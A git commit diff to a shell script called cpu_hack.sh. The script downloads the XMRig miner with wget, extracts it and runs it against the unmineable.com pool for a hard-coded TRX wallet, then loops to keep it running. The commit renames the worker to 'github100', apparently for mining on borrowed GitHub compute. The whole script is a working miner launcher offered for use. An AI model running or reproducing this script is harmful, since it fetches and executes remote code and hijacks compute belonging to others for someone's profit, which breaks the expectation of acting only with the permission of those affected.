401a5522192a1d844758f578a55bb2892da1a37b
jaisai1337 <48624947+jaisai1337@users.noreply.github.com>
2021-08-18 09:36:30 +0530

    Update cpu_hack.sh

--- cpu_hack.sh
+++ cpu_hack.sh
@@ -5,7 +5,7 @@ sudo apt install screen -y
 wget https://github.com/xmrig/xmrig/releases/download/v6.14.0/xmrig-6.14.0-linux-x64.tar.gz
 tar xf xmrig-6.14.0-linux-x64.tar.gz
 cd xmrig-6.14.0
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TY4bwi9zUbyeZgeiSZp8dHrRigjHFkB11e.God_Miner#ek61-6h9x -p x --cpu 4
+./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TY4bwi9zUbyeZgeiSZp8dHrRigjHFkB11e.github100 -p x --cpu 4
 while [ 1 ]; do
 sleep 3
 done
